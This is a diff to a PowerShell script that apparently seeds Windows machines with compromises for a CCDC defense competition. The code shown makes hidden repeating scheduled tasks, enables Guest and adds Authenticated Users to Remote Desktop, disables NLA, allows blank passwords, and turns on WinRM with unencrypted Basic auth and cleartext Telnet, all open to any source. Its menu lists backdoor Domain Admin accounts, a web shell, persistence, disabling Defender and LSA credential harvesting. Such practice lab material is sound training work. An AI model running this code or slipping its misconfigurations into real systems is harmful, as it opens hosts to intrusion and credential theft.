@@ -437,7 +437,7 @@ Start-Process -FilePath 'notepad.exe' -ArgumentList '$Task1MessageFile'
         -Argument   "-NonInteractive -WindowStyle Hidden -EncodedCommand $Task1Encoded"
 
     $Task1Trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 3) `
-        -RepetitionDuration ([System.TimeSpan]::MaxValue) `
+        -RepetitionDuration (New-TimeSpan -Days 3650) `
         -Once -At (Get-Date).AddSeconds(10)
 
     $Task1Settings = New-ScheduledTaskSettingsSet `
@@ -500,7 +500,7 @@ foreach ($svc in $services) {
         -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $Task2Encoded"
 
     $Task2Trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 3) `
-        -RepetitionDuration ([System.TimeSpan]::MaxValue) `
+        -RepetitionDuration (New-TimeSpan -Days 3650) `
         -Once -At (Get-Date).AddSeconds(30)
 
     $Task2Settings = New-ScheduledTaskSettingsSet `
@@ -884,18 +884,20 @@ function Invoke-RemoteAccess {
         Set-ItemProperty -Path $RdpRegPath    -Name "MaxInstanceCount"     -Value 0xFFFF -Type DWord -ErrorAction Stop
         Write-Warn "  NLA disabled, blank passwords allowed, session limit removed"
 
-        try {
-            $sid     = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
-            $account = $sid.Translate([System.Security.Principal.NTAccount])
-            Add-LocalGroupMember -Group "Remote Desktop Users" -Member $account -ErrorAction Stop
+        & net localgroup "Remote Desktop Users" "NT AUTHORITY\Authenticated Users" /add 2>&1 | Out-Null
+        if ($LASTEXITCODE -eq 0 -or $LASTEXITCODE -eq 2) {
             Write-Warn "  Authenticated Users added to Remote Desktop Users"
-        } catch { Write-Warn "  Authenticated Users may already be in RDP group: $_" }
+        } else {
+            Write-Warn "  Could not add Authenticated Users to Remote Desktop Users (exit $LASTEXITCODE)"
+        }
 
-        net user Guest /active:yes 2>&1 | Out-Null
-        try {
-            Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Guest" -ErrorAction Stop
+        & net user Guest /active:yes 2>&1 | Out-Null
+        & net localgroup "Remote Desktop Users" "Guest" /add 2>&1 | Out-Null
+        if ($LASTEXITCODE -eq 0 -or $LASTEXITCODE -eq 2) {
             Write-Warn "  Guest enabled and added to Remote Desktop Users"
-        } catch { Write-Warn "  Guest may already be in RDP group: $_" }
+        } else {
+            Write-Warn "  Could not add Guest to Remote Desktop Users (exit $LASTEXITCODE)"
+        }
 
         Set-Service -Name "TermService" -StartupType Automatic -ErrorAction Stop
         Start-Service -Name "TermService" -ErrorAction Stop
@@ -910,7 +912,14 @@ function Invoke-RemoteAccess {
     # -- WinRM (TCP 5985) ------------------------------------------------------
     Write-Info "Configuring WinRM (TCP 5985)..."
     try {
-        Enable-PSRemoting -Force -SkipNetworkProfileCheck -ErrorAction Stop
+        try {
+            Enable-PSRemoting -Force -SkipNetworkProfileCheck -ErrorAction Stop
+        } catch {
+            if ($_ -match 'firewall' -or $_ -match 'WSManFault') {
+                Write-Warn "  Enable-PSRemoting partial (firewall service disabled) -- WinRM already running, continuing"
+            } else { throw }
+        }
+        Write-Success "WinRM service running"
         Set-Item WSMan:\localhost\Client\TrustedHosts       -Value '*' -Force -ErrorAction Stop
         Set-Item WSMan:\localhost\Service\Auth\Basic        -Value $true -ErrorAction Stop
         Set-Item WSMan:\localhost\Service\AllowUnencrypted  -Value $true -ErrorAction Stop
@@ -966,9 +975,21 @@ Subsystem sftp C:/Windows/System32/OpenSSH/sftp-server.exe
             Set-ItemProperty -Path $sshRegPath -Name "DefaultShell" -Value $psExe -ErrorAction Stop
         }
 
-        Set-Service -Name "sshd" -StartupType Automatic -ErrorAction Stop
-        Restart-Service -Name "sshd" -ErrorAction Stop
-        Write-Success "  sshd started (Automatic)"
+        $sshdExe = "$env:SystemRoot\System32\OpenSSH\sshd.exe"
+        $sshdSvc = Get-Service -Name "sshd" -ErrorAction SilentlyContinue
+        if (-not $sshdSvc -and (Test-Path $sshdExe)) {
+            & sc.exe create sshd binPath= "`"$sshdExe`"" start= auto | Out-Null
+            Write-Info "  sshd service registered via sc.exe"
+            Start-Sleep -Seconds 2
+            $sshdSvc = Get-Service -Name "sshd" -ErrorAction SilentlyContinue
+        }
+        if ($sshdSvc) {
+            Set-Service -Name "sshd" -StartupType Automatic -ErrorAction Stop
+            Restart-Service -Name "sshd" -Force -ErrorAction Stop
+            Write-Success "  sshd started (Automatic)"
+        } else {
+            Write-Warn "  sshd not in SCM yet -- config written; restart may be required"
+        }
 
         if (-not (Get-NetFirewallRule -DisplayName "CCDC-SSH-Any" -ErrorAction SilentlyContinue)) {
             New-NetFirewallRule -DisplayName "CCDC-SSH-Any" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -RemoteAddress Any | Out-Null
@@ -979,8 +1000,10 @@ Subsystem sftp C:/Windows/System32/OpenSSH/sftp-server.exe
     # -- Telnet (TCP 23) -------------------------------------------------------
     Write-Info "Configuring Telnet Server (TCP 23)..."
     try {
-        $feature = Get-WindowsFeature -Name Telnet-Server -ErrorAction Stop
-        if ($feature.InstallState -ne "Installed") {
+        $feature = Get-WindowsFeature -Name Telnet-Server -ErrorAction SilentlyContinue
+        if ($null -eq $feature) {
+            Write-Warn "  Telnet-Server feature not found on this SKU -- skipping install"
+        } elseif ($feature.InstallState -ne "Installed") {
             Install-WindowsFeature -Name Telnet-Server -ErrorAction Stop | Out-Null
             Write-Success "  Telnet Server installed"
         }
@@ -992,9 +1015,14 @@ Subsystem sftp C:/Windows/System32/OpenSSH/sftp-server.exe
         Set-ItemProperty -Path $TelnetRegPath -Name "AllowTrustedDomain"  -Value 1     -Type DWord -ErrorAction Stop
         Write-Warn "  AuthMode=3 (NTLM+cleartext), SessionTimeout=0, MaxConnections=999"
 
-        Set-Service  -Name "TlntSvr" -StartupType Automatic -ErrorAction Stop
-        Start-Service -Name "TlntSvr" -ErrorAction Stop
-        Write-Success "  TlntSvr started (Automatic)"
+        $tlntSvc = Get-Service -Name "TlntSvr" -ErrorAction SilentlyContinue
+        if ($tlntSvc) {
+            Set-Service  -Name "TlntSvr" -StartupType Automatic -ErrorAction Stop
+            Start-Service -Name "TlntSvr" -ErrorAction Stop
+            Write-Success "  TlntSvr started (Automatic)"
+        } else {
+            Write-Warn "  TlntSvr service not found -- registry config written; restart may be required"
+        }
 
         if (-not (Get-NetFirewallRule -DisplayName "CCDC-Telnet-Any" -ErrorAction SilentlyContinue)) {
             New-NetFirewallRule -DisplayName "CCDC-Telnet-Any" -Direction Inbound -Protocol TCP -LocalPort 23 -Action Allow -RemoteAddress Any | Out-Null
@@ -1005,11 +1033,15 @@ Subsystem sftp C:/Windows/System32/OpenSSH/sftp-server.exe
     # -- SNMP (UDP 161) --------------------------------------------------------
     Write-Info "Configuring SNMP Service (UDP 161)..."
     try {
-        $feature = Get-WindowsFeature -Name SNMP-Service -ErrorAction Stop
-        if ($feature.InstallState -ne "Installed") {
+        $feature = Get-WindowsFeature -Name SNMP-Service -ErrorAction SilentlyContinue
+        if ($null -eq $feature) {
+            Write-Warn "  SNMP-Service feature not found on this SKU -- skipping install"
+        } elseif ($feature.InstallState -ne "Installed") {
             Install-WindowsFeature -Name SNMP-Service -IncludeManagementTools -ErrorAction Stop | Out-Null
             Write-Success "  SNMP Service installed"
         }
+
+        if (-not (Test-Path $SnmpBasePath)) { New-Item -Path $SnmpBasePath -Force | Out-Null }
 
         $validCommPath = "$SnmpBasePath\ValidCommunities"
         if (-not (Test-Path $validCommPath)) { New-Item -Path $validCommPath -Force | Out-Null }
@@ -1024,9 +1056,15 @@ Subsystem sftp C:/Windows/System32/OpenSSH/sftp-server.exe
         Set-ItemProperty -Path $SnmpBasePath -Name "EnableAuthenticationTraps" -Value 0 -Type DWord -ErrorAction Stop
         Write-Warn "  EnableAuthenticationTraps = 0 (failed-auth traps suppressed)"
 
-        Set-Service  -Name "SNMP" -StartupType Automatic -ErrorAction Stop
-        Restart-Service -Name "SNMP" -ErrorAction Stop
-        Write-Success "  SNMP started (Automatic)"
+        $snmpSvc = Get-Service -Name "SNMP" -ErrorAction SilentlyContinue
+        if ($snmpSvc) {
+            Set-Service  -Name "SNMP" -StartupType Automatic -ErrorAction Stop
+            Restart-Service -Name "SNMP" -ErrorAction Stop
+            Write-Success "  SNMP started (Automatic)"
+        } else {
+            Write-Warn "  SNMP service not yet in SCM -- restart required to start service"
+            Write-Warn "  Registry config written; communities and permissions take effect after reboot"
+        }
 
         if (-not (Get-NetFirewallRule -DisplayName "CCDC-SNMP-Any" -ErrorAction SilentlyContinue)) {
             New-NetFirewallRule -DisplayName "CCDC-SNMP-Any" -Direction Inbound -Protocol UDP -LocalPort 161 -Action Allow -RemoteAddress Any | Out-Null
@@ -1518,25 +1556,21 @@ foreach (`$name in `$targets) {
 }
 
 # =============================================================================
-# MAIN  - Interactive menu or -Modules param dispatch
+# MAIN  - Interactive menu loop or -Modules param dispatch
 # =============================================================================
 
-function Show-Menu {
-    Write-Host ""
-    Write-Host "  Select modules to run (numbers, comma-separated, or A for all):" -ForegroundColor Yellow
-    Write-Host "    [1] Rogue Users       - 3 backdoor Domain Admin AD accounts"
-    Write-Host "    [2] Web Shell         - Rogue IIS site on port 777"
-    Write-Host "    [3] Scheduled Tasks   - Notepad alert + service killer every 3 min"
-    Write-Host "    [4] Persistence       - 5-location startup persistence planter"
-    Write-Host "    [5] Defender Neuter   - Disable Defender, Firewall, Security Center"
-    Write-Host "    [6] Remote Access     - Misconfigure RDP, WinRM, SSH, Telnet, SNMP"
-    Write-Host "    [7] LSA Loot          - LSA SSP/CredProvider credential harvesting"
-    Write-Host "    [8] DLL Hook          - AppInit_DLLs, AppCert DLLs, search-order hijack"
-    Write-Host "    [9] SysInternals      - 7-layer block on Sysinternals forensic tools"
-    Write-Host "    [A] All of the above"
-    Write-Host "    [Q] Quit"
-    Write-Host ""
-}
+# Menu entry definitions
+$menuItems = @(
+    @{ Key='1'; Name='Users';          Label='Rogue Users       - 3 backdoor Domain Admin AD accounts' }
+    @{ Key='2'; Name='WebShell';       Label='Web Shell         - Rogue IIS site on port 777' }
+    @{ Key='3'; Name='ScheduledTasks'; Label='Scheduled Tasks   - Notepad alert + service killer every 3 min' }
+    @{ Key='4'; Name='Persistence';    Label='Persistence       - 5-location startup persistence planter' }
+    @{ Key='5'; Name='DefenderNeuter'; Label='Defender Neuter   - Disable Defender, Firewall, Security Center' }
+    @{ Key='6'; Name='RemoteAccess';   Label='Remote Access     - Misconfigure RDP, WinRM, SSH, Telnet, SNMP' }
+    @{ Key='7'; Name='LSA';            Label='LSA Loot          - LSA SSP/CredProvider credential harvesting' }
+    @{ Key='8'; Name='DLLHook';        Label='DLL Hook          - AppInit_DLLs, AppCert DLLs, search-order hijack' }
+    @{ Key='9'; Name='SysInternals';   Label='SysInternals      - 7-layer block on Sysinternals forensic tools' }
+)
 
 # Map both numbers and names to a canonical name
 $moduleMap = @{
@@ -1560,16 +1594,105 @@ $moduleMap = @{
     'SYSINTERNALS'    = 'SysInternals'
 }
 
-$selected = @()
+# Canonical execution order (dependency-safe)
+$execOrder = @('Users','WebShell','ScheduledTasks','Persistence',
+               'DefenderNeuter','RemoteAccess','LSA','DLLHook','SysInternals')
 
+function Show-Menu {
+    param([hashtable]$Status = @{})
+    Write-Host ""
+    Write-Host "  CCDC Windows Combined Setup" -ForegroundColor Cyan
+    Write-Host "  Select modules to run (numbers, comma-separated, or A for all):" -ForegroundColor Yellow
+    Write-Host ""
+    foreach ($item in $menuItems) {
+        if ($Status.ContainsKey($item.Name)) {
+            if ($Status[$item.Name] -eq 'ok') {
+                Write-Host -NoNewline "    [$($item.Key)] "
+                Write-Host -NoNewline "[DONE] " -ForegroundColor Green
+                Write-Host $item.Label
+            } else {
+                Write-Host -NoNewline "    [$($item.Key)] "
+                Write-Host -NoNewline "[FAIL] " -ForegroundColor Red
+                Write-Host $item.Label
+            }
+        } else {
+            Write-Host "    [$($item.Key)]        $($item.Label)"
+        }
+    }
+    Write-Host "    [A]        All of the above"
+    Write-Host "    [Q]        Quit / Done"
+    Write-Host ""
+}
+
+function Invoke-Modules {
+    param([string[]]$ToRun, [hashtable]$Status)
+    foreach ($mod in $execOrder) {
+        if ($ToRun -contains $mod) {
+            try {
+                switch ($mod) {
+                    'Users'          { Invoke-RogueUsers }
+                    'WebShell'       { Invoke-RogueWebShell }
+                    'ScheduledTasks' { Invoke-ScheduledTasks }
+                    'Persistence'    { Invoke-PersistencePlanter }
+                    'DefenderNeuter' { Invoke-DefenderNeuter }
+                    'RemoteAccess'   { Invoke-RemoteAccess }
+                    'LSA'            { Invoke-LSALootTheVault }
+                    'DLLHook'        { Invoke-DLLHookLineAndSinker }
+                    'SysInternals'   { Invoke-SysInternalsNuker }
+                }
+                $Status[$mod] = 'ok'
+            } catch {
+                Write-Err "Module '$mod' failed: $_"
+                $Status[$mod] = 'fail'
+            }
+        }
+    }
+}
+
+# -- Non-interactive path (-Modules param supplied) ---------------------------
 if ($Modules.Count -gt 0) {
-    $selected = $Modules
-} else {
-    Show-Menu
+    $toRun = @()
+    foreach ($s in $Modules) {
+        $key = $s.ToUpper()
+        if ($moduleMap.ContainsKey($key)) {
+            $canonical = $moduleMap[$key]
+            if ($toRun -notcontains $canonical) { $toRun += $canonical }
+        } else {
+            Write-Warn "Unknown module '$s' -- skipping."
+        }
+    }
+    if ($toRun.Count -eq 0) { Write-Err "No valid modules specified."; exit 1 }
+    Write-Info "Running: $($toRun -join ', ')"
+    $ran = @{}
+    Invoke-Modules -ToRun $toRun -Status $ran
+    Write-Section "DONE"
+    Write-Success "Selected modules complete."
+    Write-Warn "Target setup (CCDC_Windows_TargetSetup_HTTP_FTP_DNS.ps1) is separate -- run it independently if needed."
+    exit 0
+}
+
+# -- Interactive loop ----------------------------------------------------------
+$ran = @{}
+
+while ($true) {
+    Show-Menu -Status $ran
+
     $raw = (Read-Host "  Choice").Trim().ToUpper()
 
     if ($raw -eq 'Q') {
-        Write-Warn "Aborted."
+        Write-Host ""
+        if ($ran.Count -gt 0) {
+            Write-Section "SESSION SUMMARY"
+            foreach ($mod in $execOrder) {
+                if ($ran.ContainsKey($mod)) {
+                    if ($ran[$mod] -eq 'ok') { Write-Success "  [DONE] $mod" }
+                    else                     { Write-Err     "  [FAIL] $mod" }
+                }
+            }
+            Write-Host ""
+        }
+        Write-Warn "Exiting."
+        Write-Warn "Target setup (CCDC_Windows_TargetSetup_HTTP_FTP_DNS.ps1) is separate -- run it independently if needed."
         exit 0
     }
 
@@ -1578,50 +1701,27 @@ if ($Modules.Count -gt 0) {
     } else {
         $selected = $raw -split '[,\s]+' | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne '' }
     }
-}
 
-$toRun = @()
-foreach ($s in $selected) {
-    $key = $s.ToUpper()
-    if ($moduleMap.ContainsKey($key)) {
-        $canonical = $moduleMap[$key]
-        if ($toRun -notcontains $canonical) { $toRun += $canonical }
-    } else {
-        Write-Warn "Unknown selection '$s' -- skipping."
-    }
-}
-
-if ($toRun.Count -eq 0) {
-    Write-Err "No valid modules selected. Exiting."
-    exit 1
-}
-
-Write-Host ""
-Write-Info "Modules to run: $($toRun -join ', ')"
-
-# Always execute in dependency order
-foreach ($mod in @('Users','WebShell','ScheduledTasks','Persistence',
-                   'DefenderNeuter','RemoteAccess','LSA','DLLHook','SysInternals')) {
-    if ($toRun -contains $mod) {
-        try {
-            switch ($mod) {
-                'Users'          { Invoke-RogueUsers }
-                'WebShell'       { Invoke-RogueWebShell }
-                'ScheduledTasks' { Invoke-ScheduledTasks }
-                'Persistence'    { Invoke-PersistencePlanter }
-                'DefenderNeuter' { Invoke-DefenderNeuter }
-                'RemoteAccess'   { Invoke-RemoteAccess }
-                'LSA'            { Invoke-LSALootTheVault }
-                'DLLHook'        { Invoke-DLLHookLineAndSinker }
-                'SysInternals'   { Invoke-SysInternalsNuker }
-            }
-        } catch {
-            Write-Err "Module '$mod' failed: $_"
+    $toRun = @()
+    foreach ($s in $selected) {
+        $key = $s.ToUpper()
+        if ($moduleMap.ContainsKey($key)) {
+            $canonical = $moduleMap[$key]
+            if ($toRun -notcontains $canonical) { $toRun += $canonical }
+        } else {
+            Write-Warn "Unknown selection '$s' -- skipping."
         }
     }
-}
 
-Write-Section "DONE"
-Write-Success "Selected modules complete."
-Write-Warn "Target setup (CCDC_Windows_TargetSetup_HTTP_FTP_DNS.ps1) is separate -- run it independently if needed."
-Write-Host ""
+    if ($toRun.Count -eq 0) {
+        Write-Warn "No valid modules selected -- try again."
+        continue
+    }
+
+    Write-Host ""
+    Write-Info "Running: $($toRun -join ', ')"
+    Invoke-Modules -ToRun $toRun -Status $ran
+
+    Write-Host ""
+    Write-Success "Batch complete."
+}
